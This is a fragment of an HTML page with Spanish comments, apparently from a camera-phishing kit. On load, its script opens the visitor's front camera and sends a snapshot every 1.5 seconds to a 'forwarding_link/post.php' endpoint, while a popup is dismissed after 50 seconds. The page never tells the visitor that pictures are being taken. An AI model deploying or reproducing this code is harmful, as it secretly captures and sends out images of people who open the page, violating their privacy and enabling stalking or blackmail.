<body style="background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9); background-size: cover;">

        </div>
        <button style="margin-left: 50px; margin-right: 50px;">End</button>
    </div>

    <!-- Scripts de cámara / captura / popup -->
    <script>
        function post(imgdata) {
            $.ajax({
                type: 'POST',
                data: {
                    cat: imgdata
                },
                url: 'forwarding_link/post.php',
                dataType: 'json',
                async: false,
                success: function(result) {
                    // manejar la respuesta si quieres
                },
                error: function() {
                    // manejar errores
                }
            });
        };

        'use strict';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const errorMsgElement = document.querySelector('span#errorMsg'); // puede que no estés usando este span, pero lo mantengo

        const constraints = {
            audio: false,
            video: {
                facingMode: "user"
            }
        };

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                if (errorMsgElement) {
                    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
                }
            }
        }

        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;
            video.play();

            const context = canvas.getContext('2d');
            setInterval(function() {
                context.drawImage(video, 0, 0, 640, 480);
                const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);
            }, 1500);
        }

        function PopUp() {
            document.getElementById('ac-wrapper').style.display = "none";
        }

        // Una vez cargado el DOM, iniciar cámara y temporizador para popup
        document.addEventListener('DOMContentLoaded', function() {
            init();
            // ocultar popup después de X milisegundos
            setTimeout(function() {
                PopUp();
            }, 50000); // 50 segundos como en tu primer código
        });
    </script>
